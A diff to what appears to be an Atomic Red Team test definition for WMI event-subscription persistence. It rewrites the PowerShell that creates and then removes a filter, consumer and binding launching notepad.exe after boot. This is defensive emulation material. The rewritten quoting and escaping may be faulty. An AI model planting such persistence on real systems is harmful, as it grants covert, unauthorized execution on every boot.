@@ -21,22 +21,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-
-      $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
-                      EventNameSpace='root\CimV2';
-                      QueryLanguage="WQL";
-                      Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
-      $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
-
-      $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
-                      CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
-      $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
-
-      $FilterToConsumerArgs = @{
-      Filter = [Ref] $Filter;
-      Consumer = [Ref] $Consumer;
-      }
-      $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
+      $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example'; EventNameSpace='root\\CimV2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example'; CommandLineTemplate='$($Env:SystemRoot)\\System32\\notepad.exe';}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{ Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
 
 - name: Persistence Cleanup
   description: |
@@ -54,11 +39,4 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      
-      $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
-      $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
-      $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
-
-      $FilterConsumerBindingToCleanup | Remove-WmiObject
-      $EventConsumerToCleanup | Remove-WmiObject
-      $EventFilterToCleanup | Remove-WmiObject
+      $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-Example'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query 'REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding'; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject
